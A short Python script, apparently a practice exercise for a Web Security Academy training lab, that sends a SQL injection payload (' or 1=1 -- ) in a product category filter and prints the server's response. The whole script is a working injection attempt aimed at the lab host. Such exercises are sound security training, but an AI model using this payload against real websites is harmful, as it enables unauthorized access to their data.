# connect  url with session and use try except , function with args

import requests 
from typing import Optional

BASE_URL = "https://0ad2004d035ad52580732b9900d10030.web-security-academy.net"
session = requests.session();

# 因為回傳有可能none所以包optional示意
def send_request(url: str, timeout: int = 10) -> Optional[requests.Response]:
    try:
        return session.get(url, timeout=timeout)
    except requests.RequestException as e:
        print(f"error: {e}" )
        return None

def main():
    payload = "/filter?category=Lifestyle' or 1=1 -- "
    response = send_request(BASE_URL+ payload)
    if response and response.status_code==200:
        print(response.text)
    else:
        print("connect fail")


if __name__ == "__main__":
    main()